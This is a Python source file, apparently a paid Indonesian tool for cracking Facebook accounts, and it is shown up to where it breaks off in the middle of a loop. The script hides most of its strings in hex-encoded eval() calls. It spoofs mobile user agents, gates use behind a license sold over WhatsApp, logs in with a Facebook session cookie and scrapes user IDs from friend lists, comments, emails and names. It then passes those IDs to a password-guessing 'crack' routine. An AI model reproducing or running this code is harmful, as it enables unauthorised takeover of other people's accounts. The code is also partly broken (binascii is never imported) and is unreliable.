from builtins import all,dir,exec,id,input,len,print,dict,int,range,str,open,exit
exec('')
import os,sys,re,time,requests,calendar,random,bs4,uuid,json,subprocess
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import date,datetime
from requests.exceptions import ConnectionError
ses=requests.Session()
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console=Console()
M2='[#FF0000]' # MERAH
H2='[#00FF00]' # HIJAU
K2='[#FFFF00]' # KUNING
B2='[#00C8FF]' # BIRU
P2='[#FFFFFF]' # PUTIH
U2='[#AF00FF]' # UNGU
O2='[#FF8F00]' # ORANGE
AA='[#AAAAAA]' # Abu-Abu
sekarang=calendar.timegm(time.gmtime(time.time()))
tampung=[]
ugent=[]
ugen=[]
hakix=[]
try:
	file_color=open('data/theme_color','r').read()
	color_text=file_color.split('|')[0]
	color_panel=file_color.split('|')[1]
except:
	color_text='[#00FF00]'
	W1=random.choice([M2,H2,K2])
	W2=random.choice([K2,M2,K2])
	W3=random.choice([H2,K2,M2])
	color_panel='#AF00FF'
	color_ok='#AF00FF'
	color_cp='#00C8FF'
for z in range(200):
	versi_android=str(random.randint(4,12))+'.0.1'
	rr=random.randint
	rc=random.choice
	android_0=str(random.randint(4,12))
	android_1=str(random.randint(4,11))
	chrome_1=str(random.randint(111,555))+'.0.0.'+str(random.randint(10,30))+'.'+str(random.randint(10,150))
	chrome_2=str(random.randint(1,99))+'.0.'+str(random.randint(10,50))
	redmi=random.choice(['Redmi Note 10 Pro','Redmi Note 10S','Redmi Note 10 5G','Redmi Note 9 Pro','Redmi Note 9S','Redmi Note 9','Redmi Note 8 Pro','Redmi Note 8','Redmi 9T','Redmi 9 Power','Redmi 9A','Redmi 9','Redmi 8A Dual','Redmi 8A','Redmi 8','Redmi 7A','Redmi 7','Redmi 6A','Redmi 6','Redmi Note 7 Pro','Redmi Note 7','Redmi Y3','Redmi Go','Redmi K30 Pro','Redmi K30 5G','Redmi K30i 5G','Redmi K20 Pro','Redmi K20','Redmi S2','Redmi Note 6 Pro'])
	oppo=random.choice(['CPH1909','CPH1911','CPH1969','CPH1933','CPH2213','CPH2145','CPH2185','CPH1729','CPH2025','CPH1823','CPH1907','CPH1717','CPH1609','CPH196','CPH2015','CPH2083','CPH2089','CPH2135','CPH1937','CPH1938','CPH1923','CPH1827','CPH1803','CPH1809','CPH1853','CPH1919','CPH1989','CPH2109','CPH2211','CPH2197'])
	vivo=random.choice(['V1813BA','V1813BT','V1813DA','V1813EA','V1813T','V1816A','V1816T','V1818A','V1818T','V1819A','V1819T','V1821A','V1821T','V1822A','V1822T','V1930A','V1930T','V1931A','V1931T','V1932A','V1932T','V1933A','V1933T','V1934A','V1934T','V1935A','V1935T','V1936A','V1936T','V1938A','Vivo 1920','Vivo 1921','Vivo 1922','Vivo 1923','Vivo 1924','Vivo 1925','Vivo 1930A','Vivo 1930T','Vivo 1931A','Vivo 1931T','Vivo 1932A','Vivo 1932T','Vivo 1933A','Vivo 1933T','Vivo 1934A','Vivo 1830','Vivo 1811','Vivo 1812','Vivo 1813','Vivo 1815','Vivo 1816A','Vivo 1816T','Vivo 1818A','Vivo 1818T','Vivo 1819A','Vivo 1819T','Vivo 1821A','Vivo 1821T','Vivo 1822A','Vivo 1822T'])
	realme=random.choice(['RMX1941','RMX2185','RMX2001','RMX3063','RMX3061','RMX3092','RMX3142','RMX3381','RMX2195','RMX3143','RMX3361','RMX3181','RMX1971','RMX1911','RMX2121','RMX2103','RMX2111','RMX3081','RMX3171','RMX3261','RMX2189'])
	infinix=random.choice(['X695','X688B','X687B','X692','X657C','X682B','X652','X655C','X573S','X650B','X606C','X624B','X690B','X657B','X652C','X682C','X680','X682','X655D','X680B'])
	poco=random.choice(['POCO F2 Pro','POCO X3 NFC','POCO X3 Pro','POCO X3 GT','POCO M3 Pro 5G','POCO M3','POCO C4','POCO X2','POCO X2 Pro','POCO F3','POCO F3 GT','POCO F3 Pro','POCO M2','POCO M2 Reloaded','POCO M2 Pro','POCO M3 Pro 5G','POCO X3','POCO X3 Pro','POCO X3 GT','POCO X4','POCO X4 Pro','POCO X4 GT','POCO X5','POCO X5 Pro','POCO X5 GT','POCO X6','POCO X6 Pro','POCO X6 GT','POCO X7','POCO X7 Pro'])
	xiaomi=random.choice(['MI 5X MIUI','Mi 11','Mi 11 Lite','Mi 11 Pro','Mi 11 Ultra','Mi 11i','Mi 11X','Mi 11X Pro','Mi 10','Mi 10 Pro','Mi 10T','Mi 10T Pro','Mi 10T Lite','Mi 10 Lite','Mi 10 Youth','Mi 9','Mi 9 Pro','Mi 9 SE','Mi 9 Lite','Mi 9T','Mi 9T Pro','Mi 8','Mi 8 Pro','Mi 8 SE','Mi Note 10','Mi Note 10 Pro','Mi Note 10 Lite','Mi Mix 3','Mi Mix 2S','Mi A3'])
	samsung=random.choice(['SM-G530H','SM-G531H','SM-G532G','SM-G550FY','SM-G570F','SM-G575F','SM-G5700','SM-G571F','SM-G572F','SM-G530BT'])
	vivoo=random.choice(['V3Max','V3Lite','V3','V2Pro','V2Plus','V2','V2s','V2L','V3i','V3M','V3C','V3E','V3T','V3X','V3Y47','V3MaxA','V3MaxL','V3MaxS','V3MaxV','V3MaxX','V3MaxY','V3Pro'])
	dens=random.choice(['{density=3.0,width=1080,height=1920};FB_FW/1;]','{density=2.0,width=1424,height=720};FB_FW/1;]','{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','{density=2.0,width=720,height=1472};]'])
	uaa=eval(binascii.unhexlify(b'66224d6f7a696c6c612f352e3020284c696e75783b20416e64726f6964207b616e64726f69645f307d3b207b7265646d697d204275696c642f514b51312e7b737472287272283139313030302c31393139393929297d2e3030313b20777629204170706c655765624b69742f3533372e333620284b48544d4c2c206c696b65204765636b6f292056657273696f6e2f342e30204368726f6d652f7b737472287272283130302c32393929297d2e302e7b73747228727228323030302c3639393929297d2e7b7374722872722837302c31353029297d204d6f62696c65205361666172692f3533372e3336205b46425f4941422f464234413b464241562f7b737472287272283230302c33393929297d2e302e302e7b7374722872722831302c373029297d2e7b737472287272283130302c31393929297d3b5d22').decode('8ftu'[::+-+-(-(+1))]))
	uab=eval(binascii.unhexlify(b'662244616c76696b2f322e312e3020284c696e75783b20553b20416e64726f6964207b616e64726f69645f307d2e312e303b207b6f70706f7d204275696c642f4f313130313929205b4642414e2f4f7263612d416e64726f69643b464241562f7b737472287272283230302c33393929297d2e302e302e7b7374722872722831352c373029297d2e7b737472287272283130302c31373029297d3b4642504e2f636f6d2e66616365626f6f6b2e6f7263613b46424c432f74685f54483b464242562f3138323734373434303b464243522f545255452d483b46424d462f4f50504f3b464242442f4f50504f3b464244562f7b6f70706f7d3b464253562f7b616e64726f69645f307d2e312e303b464243412f61726d656162692d7637613a61726d656162693b4642444d2f22').decode('8ftu'[::+-+-(-(+1))]))
	uac=eval(binascii.unhexlify(b'662244616c76696b2f322e312e3020284c696e75783b20553b20416e64726f6964207b616e64726f69645f307d2e312e313b207b7669766f6f7d204275696c642f4c4d5934375629205b4642414e2f4f7263612d416e64726f69643b464241562f7b737472287272283230302c33393929297d2e302e302e7b7374722872722831352c373029297d2e7b737472287272283130302c31373029297d3b4642504e2f636f6d2e66616365626f6f6b2e6f7263613b46424c432f656e5f55533b464242562f7b737472287272283137303030303030302c31373939393939393929297d3b464243522f6e756c6c3b46424d462f7669766f3b464242442f7669766f3b464244562f7669766f207b7669766f6f7d3b464253562f7b616e64726f69645f307d2e312e313b464243412f61726d656162692d7637613a61726d656162693b4642444d2f7b64656e737d22').decode('8ftu'[::+-+-(-(+1))]))
	uad=eval(binascii.unhexlify(b'662244616c76696b2f322e312e3020284c696e75783b20553b20416e64726f6964207b616e64726f69645f307d2e302e313b207b73616d73756e677d204275696c642f4d4d4232395429205b4642414e2f464234413b464241562f7b737472287272283237302c33393929297d2e302e302e7b7374722872722833302c373029297d2e7b737472287272283132302c31373029297d3b4642504e2f636f6d2e66616365626f6f6b2e6b6174616e613b46424c432f76695f564e3b464242562f7b737472287272283231303030303030302c32313939393939393929297d3b464243522f6e756c6c3b46424d462f73616d73756e673b464242442f73616d73756e673b464244562f7b73616d73756e677d3b464253562f7b616e64726f69645f307d2e302e313b464243412f61726d656162692d7637613a61726d656162693b4642444d2f7b64656e737d22').decode('8ftu'[::+-+-(-(+1))]))
	uae=eval(binascii.unhexlify(b'662244616c76696b2f322e312e3020284c696e75783b20553b20416e64726f6964207b616e64726f69645f307d3b20496e66696e6978207b696e66696e69787d204275696c642f515031412e7b737472287272283139303030302c31393939393929297d2e307b7374722872722832302c393029297d29205b4642414e2f4d657373656e6765724c6974653b464241562f7b737472287272283230302c33393929297d2e302e302e7b73747228727228312c373029297d2e7b737472287272283131352c31373029297d3b4642504e2f636f6d2e66616365626f6f6b2e6d6c6974653b46424c432f656e5f55533b464242562f7b737472287272283334303030303030302c33343939393939393929297d3b464243522f544e543b46424d462f494e46494e4958204d4f42494c495459204c494d495445443b464242442f496e66696e69783b464244562f496e66696e6978207b696e66696e69787d3b464253562f7b616e64726f69645f307d3b464243412f61726d36342d7638613a6e756c6c3b4642444d2f7b64656e737d22').decode('8ftu'[::+-+-(-(+1))]))
	uaf=eval(binascii.unhexlify(b'662244616c76696b2f322e312e3020284c696e75783b20553b20416e64726f6964207b616e64726f69645f307d2e312e303b207b7869616f6d697d2f567b73747228727228382c313229297d2e332e312e302e4f4442434e584d29205b4642414e2f4f7263612d416e64726f69643b464241562f7b737472287272283230302c32393929297d2e302e302e7b7374722872722831302c373029297d2e7b737472287272283130302c31373029297d3b4642504e2f636f6d2e66616365626f6f6b2e6f7263613b46424c432f656e5f55533b464242562f7b737472287272283135303030303030302c31353939393939393929297d3b464243522f4f6f7265646f6f3b46424d462f5869616f6d693b464242442f7869616f6d693b464244562f7b7869616f6d697d3b464253562f7b616e64726f69645f307d2e312e303b464243412f61726d36342d7638613a6e756c6c3b4642444d2f7b64656e737d22').decode('8ftu'[::+-+-(-(+1))]))
	ua=str(rc([uac,uaf,uab,uae,uad]))
	if ua in ugent:pass
	else:ugent.append(ua)
def tahun(fx):
	if len(fx)==15:
		if fx[:10]in['1000000000']:tahunz='2009'
		elif fx[:9]in['100000000']:tahunz='2009'
		elif fx[:8]in['10000000']:tahunz='2009'
		elif fx[:7]in['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz='2009'
		elif fx[:7]in['1000006','1000007','1000008','1000009']:tahunz='2010'
		elif fx[:6]in['100001']:tahunz='2010-2011'
		elif fx[:6]in['100002','100003']:tahunz='2011-2012'
		elif fx[:6]in['100004']:tahunz='2012-2013'
		elif fx[:6]in['100005','100006']:tahunz='2013-2014'
		elif fx[:6]in['100007','100008']:tahunz='2014-2015'
		elif fx[:6]in['100009']:tahunz='2015'
		elif fx[:5]in['10001']:tahunz='2015-2016'
		elif fx[:5]in['10002']:tahunz='2016-2017'
		elif fx[:5]in['10003']:tahunz='2018'
		elif fx[:5]in['10004']:tahunz='2019'
		elif fx[:5]in['10005']:tahunz='2020'
		elif fx[:5]in['10006','10007','10008']:tahunz='2021-2022'
		else:tahunz=''
	elif len(fx)in[9,10]:
		tahunz='2008-2009'
	elif len(fx)==8:
		tahunz='2007-2008'
	elif len(fx)==7:
		tahunz='2006-2007'
	else:tahunz=''
	return tahunz
dic={'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2={'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl=datetime.now().day
bln=dic[(str(datetime.now().month))]
thn=datetime.now().year
okc='OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc='CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def CetakBanner(ulfahsadiyah,asu):
    Console(width=100).print(Panel(ulfahsadiyah,style='purple'),justify='center')
def whoami(kaya,kontol):
    Console(width=100).print(Panel(kaya,style='purple'),justify='center')
def licensi():
	CetakBanner(eval(binascii.unhexlify(b'662222225b677265656e5d0d0a2020205f5f205f20202020202020202020202020202020202020205f200d0a20202f202f285f29205f5f5f205f5f5f205f205f5f20205f5f5f285f290d0a202f202f207c207c2f205f5f2f205f205c20275f205c2f205f5f7c207c0d0a2f202f5f5f7c207c20285f7c20205f5f2f207c207c205c5f5f205c207c0d0a5c5f5f5f5f2f5f7c5c5f5f5f5c5f5f5f7c5f7c207c5f7c5f5f5f2f5f7c0d0a222222').decode('8ftu'[::+-+-(-(+1))])),'color(8)')
class Logo:
	def bersihkan_layar(self):
		if 'linux' in sys.platform.lower():
			try:os.system('clear')
			except:pass
		elif 'win' in sys.platform.lower():
			try:os.system('cls')
			except:pass
		else:
			try:os.system('clear')
			except:pass
	def logonya(self):
		self.bersihkan_layar()
		prints(Panel(eval(binascii.unhexlify(b'662222227b55327de295ade29480e29480e29480e29480e29480e29480e29480e29480e29480e295ae5c6ee29482207b4d327de2aca420207b4b327de2aca420207b48327de2aca4207b55327de29482205c6e7b55327de295b0e29480e29480e29480e29480e29480e29480e29480e29480e29480e295af7b42327d0d0a202020202020202020205f5f5f5f5f202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020200d0a202020202020205f5f7c5f5f5f20207c5f5f20205f5f5f5f202020205f5f5f5f5f5f20205f5f5f5f5f5f202020202020205f5f2020205f5f20205f5f5f5f202020205f5f20205f5f20205f5f5f20200d0a2020202020207c2020205f5f5f7c202020207c7c202020205c20207c2020205f5f5f7c7c2020205f5f5f7c205f5f5f207c20207c5f7c20207c7c202020205c20207c20207c2f202f207c2020207c200d0a2020202020207c2020205f5f5f7c202020207c7c20202020205c207c2020207c5f5f207c2020205f5f5f7c7c5f5f5f7c7c2020205f2020207c7c20202020205c207c20202020205c207c2020207c200d0a2020202020207c5f5f5f7c20202020205f5f7c7c5f5f7c5c5f5f5c7c5f5f5f5f5f5f7c7c5f5f5f5f5f5f7c20202020207c5f5f7c207c5f5f7c7c5f5f7c5c5f5f5c7c5f5f7c5c5f5f5c7c5f5f5f7c200d0a2020202020202020207c5f5f5f5f5f7c202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020200d0a222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
def xoshnaw():
  uuid=str(os.geteuid())+str(os.getlogin())
  id='工'.join(uuid)
  os.system('clear');licensi()
  whoami(eval(binascii.unhexlify(b'662727275b626f6c64206379616e5d4c4943454e5349204b414d55204144414c4148205b626f6c642077686974655d3a5b626f6c642077686974655d207b69647d272727').decode('8ftu'[::+-+-(-(+1))])),'color(8)')
  try:
    httpCaht=requests.get('https://github.com/Luffy-XD/Haki-Fb/blob/main/Key.txt').text
    if id in httpCaht:
      whoami(eval(binascii.unhexlify(b'662727275b626f6c6420677265656e5d484f5245204c4943454e534920414e444120535544414820414b544946205bf09fa5b35d272727').decode('8ftu'[::+-+-(-(+1))])),'color(8)')
      msg=str(os.geteuid())
      time.sleep(0.3)
      pass
    else:
      whoami(eval(binascii.unhexlify(b'662727275b626f6c64207265645d4c4943454e534920414e444120544944414b20414b544946205bf09f98a15d272727').decode('8ftu'[::+-+-(-(+1))])),'color(8)')
      whoami(eval(binascii.unhexlify(b'662727275b626f6c642079656c6c6f775d53494c41484b414e20434f50592049442044492041544153204b4952494d204b4520415554484f52205bf09f93a95d272727').decode('8ftu'[::+-+-(-(+1))])),'color(8)')
      whoami(eval(binascii.unhexlify(b'662727275b626f6c6420677265656e5d57686174736170705b626f6c642077686974655d203a205b626f6c642077686974655d202b36323832333136363731333032205b626f6c6420677265656e5d5bf09f93b25d272727').decode('8ftu'[::+-+-(-(+1))])),'color(8)')
      os.system('xdg-open https://wa.me/+6282316671302?text=BANG+SAYA+MAU+BELI+LICENSI+CRACK+FB+BERAPA+HARGA+NYA+?')
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
    if name=='__main__':
     print(logo)
     xoshnaw()
xoshnaw()
class Login:
	def __init__(self):
		self.ip=ses.get('http://ip-api.com/json/').json()['query']
		self.negara=ses.get('http://ip-api.com/json/').json()['country']
	def menu_login(self):
		Logo().logonya()
		prints(Panel(eval(binascii.unhexlify(b'66227b48327d5c74202020202020202020202020202020202020202020202020202020204d656e75204c6f67696e22').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		prints(Panel(eval(binascii.unhexlify(b'662222227b50327d5b7b636f6c6f725f746578747d30317b50327d5d2e206c6f67696e206d656e6767756e616b616e20636f6f6b69652066616365626f6f6b2028207b48327d5265636f6d656e6465647b50327d20295c6e5b7b636f6c6f725f746578747d30327b50327d5d2e206c6f67696e206d656e6767756e616b616e204e6f2064616e2050617373776f72642028207b4d327d4e6f205265636f6d656e6465647b50327d2029222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		login=console.input(eval(binascii.unhexlify(b'6622207b55327d23207b50327d70696c6968206d656e75203a2022').decode('8ftu'[::+-+-(-(+1))])))
		if login in['1','01']:
			prints(Panel(eval(binascii.unhexlify(b'662222227b50327d73696c61686b616e206d6173756b616e20636f6f6b69656d7520646973696e692064616e2070617374696b616e20617574656e74696b61736920746964616b20616b746966222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
			cookie=console.input(eval(binascii.unhexlify(b'6622207b55327d23207b50327d6d6173756b616e20636f6f6b6965203a2022').decode('8ftu'[::+-+-(-(+1))])))
			self.login_cookie(cookie)
		else:
			exit(prints(Panel(eval(binascii.unhexlify(b'662222227b4d327df09f998f206d6f686f6e206d61616620666974757220696e6920736564616e672064616c616d207461686170207065726261696b616e222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))])))))
	def login_cookie(self,cookie):
		try:
			url=ses.get('https://mbasic.facebook.com/',cookies={'cookie':cookie}).text
			if 'Apa yang Anda pikirkan sekarang' in url:
				pass
			else:
				for z in url.find_all('a',href=True):
					if 'Tidak, Terima Kasih' in z.text:
						get=ses.get('https://mbasic.facebook.com'+z['href'],cookies=cookie)
						parsing=parser(get.text,'html.parser')
						action=parsing.find('form',{'method':'post'})['action']
						data={
						 'fb_dtsg':re.search('name="fb_dtsg" value="(.*?)"',str(get.text)).group(1),
						 'jazoest':re.search('name="jazoest" value="(.*?)"',str(get.text)).group(1),
						 'submit':'OK, Gunakan Data'
						}
						post=ses.post('https://mbasic.facebook.com'+action,data=data,cookies=cookie)
						break
			open('data/cookie','w').write(cookie)
			Menu().menu()
		except:
			prints(Panel(eval(binascii.unhexlify(b'662222227b4d327d636f6f6b696520696e76616c69642c2073696c61686b616e2067756e616b616e20636f6f6b6965206c61696e2079616e67206d6173696820626172752061746175206672657368222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
			sys.exit()
	def ubah_bahasa(self,cookie):
		try:
			url=ses.get('https://mbasic.facebook.com/language/',cookies={'cookie':cookie})
			parsing=parser(url.text,'html.parser')
			for x in parsing.find_all('form',{'method':'post'}):
				if 'Bahasa Indonesia' in str(x):
					data={
					 'fb_dtsg':re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),
					 'jazoest':re.search('name="jazoest" value="(.*?)"',str(url.text)).group(1),
					 'submit':'Bahasa Indonesia'
					}
					post=ses.post('https://mbasic.facebook.com'+x['action'],data=data,cookies={'cookie':cookie})
		except:
			pass
class Menu:
	def __init__(self):
		self.men=[]
		self.id=[]
		self.ip=ses.get('http://ip-api.com/json/').json()['query']
		self.negara=ses.get('http://ip-api.com/json/').json()['country']
	def cek_login(self,cookie):
		try:
			url=ses.get('https://mbasic.facebook.com/profile.php',cookies=cookie).text
			nama=re.findall('<title>(.*?)</title>',url)[0]
			if 'Konten Tidak Ditemukan' in nama:
				try:os.remove('data/cookie')
				except:pass
				Login().menu_login()
			else:
				return nama
		except ConnectionError:
			prints(Panel(eval(binascii.unhexlify(b'662222227b4d327d6b6f6e656b736920696e7465726e6574206b616d75206265726d6173616c61682c2073696c61686b616e2063656b206b6f6e656b7369206b616d75206b656d62616c69222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
			exit()
	def menu(self):
		Logo().logonya()
		try:
			cok=open('data/cookie','r').read()
			cookie={'cookie':cok}
			nama=self.cek_login(cookie)
		except:
			try:os.remove('data/cookie')
			except:pass
			Login().menu_login()
		pornhub=[]
		yonkou=[]
		self.jol=Console()
		self.tol=Console()
		prints(Panel(eval(binascii.unhexlify(b'66227b55327d20202020202020207b73656c662e6e65676172617d22').decode('8ftu'[::+-+-(-(+1))])),width=87,padding=(0,30),title=eval(binascii.unhexlify(b'66227b42327de280a2207b55327de280a2207b41417de280a2207b42327d4e6567617261207b42327de280a2207b55327de280a2207b41417de280a222').decode('8ftu'[::+-+-(-(+1))])),subtitle=eval(binascii.unhexlify(b'66227b42327de280a2207b55327de280a2207b41417de280a2207b42327d56657273696f6e203a207b48327d302e302e31207b42327de280a2207b55327de280a2207b41417de280a222').decode('8ftu'[::+-+-(-(+1))])),style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		yonkou.append(Panel(eval(binascii.unhexlify(b'6622207b42327d4e616d6120416b756e202020202020207b55327d3a207b41417d7b6e616d617d5c6e207b42327d5374617475732050656e6767756e61207b55327d3a207b48327d5072656d69756d5c6e207b42327d497020416464726573732020202020207b55327d3a207b41417d7b73656c662e69707d5c6e207b42327d54616e6767616c2020202020202020207b55327d3a207b41417d7b74676c7d22').decode('8ftu'[::+-+-(-(+1))])),width=43,padding=(0,2),title=eval(binascii.unhexlify(b'66227b42327de280a2207b55327de280a2207b41417de280a2207b42327d496e666f2d55736572207b42327de280a2207b55327de280a2207b41417de280a222').decode('8ftu'[::+-+-(-(+1))])),style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		yonkou.append(Panel(eval(binascii.unhexlify(b'6622207b42327d417574686f722020207b55327d3a207b41417d57696c64206f6620445c6e207b42327d47697468756220207b55327d203a207b41417d4c756666792d58445c6e7b42327d2046616365626f6f6b207b55327d3a207b41417d64696b612e74772e35385c6e7b42327d205768617473617070207b55327d3a207b41417d2b36322a2a2a2a2a2a2a2a2a2a2a2a2a22').decode('8ftu'[::+-+-(-(+1))])),width=43,padding=(0,2),title=eval(binascii.unhexlify(b'66227b42327de280a2207b55327de280a2207b41417de280a2207b42327d496e666f2d417574686f72207b42327de280a2207b55327de280a2207b41417de280a222').decode('8ftu'[::+-+-(-(+1))])),style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		self.jol.print(Columns(yonkou))
		prints(Panel(eval(binascii.unhexlify(b'66227b42327d5c74202020202020202020202020202020202020202020202020202020446166746172204d656e7522').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		pornhub.append(Panel(eval(binascii.unhexlify(b'66227b50327d5b7b55327d30317b50327d5d2e207b42327d637261636b207b41417d64617269207b55327d6964207075626c696b5c6e7b50327d5b7b55327d30327b50327d5d2e207b42327d637261636b207b41417d64617269207b55327d70656e67696b75745c6e7b50327d5b7b55327d30337b50327d5d2e207b42327d637261636b207b41417d64617269207b55327d6b6f6d656e7461725c6e7b50327d5b7b55327d30347b50327d5d2e207b42327d637261636b207b41417d64617269207b55327d72616e646f6d20656d61696c22').decode('8ftu'[::+-+-(-(+1))])),width=43,padding=(0,2),style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		pornhub.append(Panel(eval(binascii.unhexlify(b'66227b50327d5b7b55327d30357b50327d5d2e207b42327d637261636b207b41417d64617269207b55327d70656e63617269616e206e616d615c6e7b50327d5b7b55327d30367b50327d5d2e207b42327d637261636b207b41417d64617269207b55327d6d656d62657220677275705c6e7b50327d5b7b55327d30377b50327d5d2e207b42327d637261636b207b41417d64617269207b55327d66696c652073656e646972695c6e7b50327d5b7b55327d30387b50327d5d2e207b55327d63656b207b41417d6f707369207b55327d636865636b706f696e7422').decode('8ftu'[::+-+-(-(+1))])),width=43,padding=(0,2),style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		self.tol.print(Columns(pornhub))
		prints(Panel(eval(binascii.unhexlify(b'662222227b50327d2020206b6574696b207b4d327d6c6f676f75747b50327d20756e74756b20686170757320636f6f6b69652064616e206b6574696b207b42327d6c61696e7b50327d20756e74756b206b65206d656e75206c61696e222222').decode('8ftu'[::+-+-(-(+1))])),width=87,padding=(0,6),style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		menu=console.input(eval(binascii.unhexlify(b'6622207b55327d23207b50327d70696c6968206d656e75203a2022').decode('8ftu'[::+-+-(-(+1))])))
		if menu in['logout']:
			os.system('rm data/cookie')
			exit(prints(Panel(eval(binascii.unhexlify(b'662222227b48327d626572686173696c206d656e67686170757320636f6f6b69652c2073696c61686b616e206b6574696b20756c616e6720707974686f6e2068616b692d66622e7079222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))])))))
		elif menu in['1','01']:
			prints(Panel(eval(binascii.unhexlify(b'662222227b50327d20202020206d6173756b616e206964207461726765742c2070617374696b616e20696420746172676574206265727369666174207075626c696b2064616e20746964616b2070726976617465222222').decode('8ftu'[::+-+-(-(+1))])),subtitle=eval(binascii.unhexlify(b'66227b50327d6b6574696b207b42327d6d657b50327d20756e74756b2064756d7020646172692074656d616e2073656e6469726922').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
			user=console.input(eval(binascii.unhexlify(b'6622207b55327d23207b50327d6d6173756b616e206964206174617520757365726e616d65203a2022').decode('8ftu'[::+-+-(-(+1))])))
			if user in['Me','me']:
				user=Dump(cookie).GetUser()
			Dump(cookie).Dump_Publik(eval(binascii.unhexlify(b'662268747470733a2f2f6d62617369632e66616365626f6f6b2e636f6d2f7b757365727d3f763d667269656e647322').decode('8ftu'[::+-+-(-(+1))])))
			Crack().atursandi()
		elif menu in['3','03']:
			prints(Panel(eval(binascii.unhexlify(b'662222227b50327d6d6173756b616e20696420706f7374696e67616e2c2070617374696b616e20706f7374696e67616e206265727369666174207075626c696b2064616e20746964616b2070726976617465222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
			user=console.input(eval(binascii.unhexlify(b'6622207b557d23207b50327d6d6173756b616e20696420706f7374696e67616e203a2022').decode('8ftu'[::+-+-(-(+1))])))
			Dump(cookie).Dump_Komentar(eval(binascii.unhexlify(b'662268747470733a2f2f6d62617369632e66616365626f6f6b2e636f6d2f7b757365727d22').decode('8ftu'[::+-+-(-(+1))])))
			Crack().atursandi()
		elif menu in['4','04']:
			prints(Panel(eval(binascii.unhexlify(b'662222227b50327d6d6173756b616e206e616d6120756e74756b20656d61696c2c20666f726d617420656d61696c20616b616e2073656c616c752040676d61696c2e636f6d222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
			user=console.input(eval(binascii.unhexlify(b'6622207b55327d23207b50327d6d6173756b616e206e616d61203a2022').decode('8ftu'[::+-+-(-(+1))])))
			limit=console.input(eval(binascii.unhexlify(b'6622207b55327d23207b50327d6d6173756b616e206c696d6974203a2022').decode('8ftu'[::+-+-(-(+1))])))
			Dump(cookie).Dump_Email(user,limit)
			Crack().atursandi()
		elif menu in['5','05']:
			prints(Panel(eval(binascii.unhexlify(b'662222227b50327d6b616d752062697361206d656e6767756e616b616e206b6f6d6120282c2920736562616761692070656d69736168206a696b61206c6562696820646172692031206e616d61222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
			user=console.input(eval(binascii.unhexlify(b'6622207b55327d23207b50327d6d6173756b616e206e616d61203a2022').decode('8ftu'[::+-+-(-(+1))])))
			common=open('Haki/nama_indonesia','r').read().splitlines()
			for idt in user.split(','):
				self.id.append(idt)
				for people in common:
					self.id.append(people+' '+idt)
			try:
				for gas in self.id:
